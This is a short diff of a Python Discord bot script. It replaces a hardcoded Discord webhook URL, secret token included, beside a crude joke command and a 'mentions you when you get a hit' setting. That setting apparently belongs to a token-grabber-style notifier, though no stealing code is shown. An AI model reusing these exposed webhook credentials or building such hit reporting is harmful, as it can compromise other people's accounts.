@@ -338,7 +338,7 @@ async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
     em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
     await ctx.send(embed=em)
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/714812226246279170/gQAvAdzpGWlAqMZpjugyphjDURkZR7Fa4C6cGPfZw-l1YZiSiutwkPdfqL0Q8Fci68QF'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/761860849283235840/bk8cXqqy4cx4rPPVFwO131KvaeYig4-24iJVZE3welZkLh9rVNnE2Cc7KyosSlr30kdF'
 
 # mentions you when you get a hit
 PING_ME = True
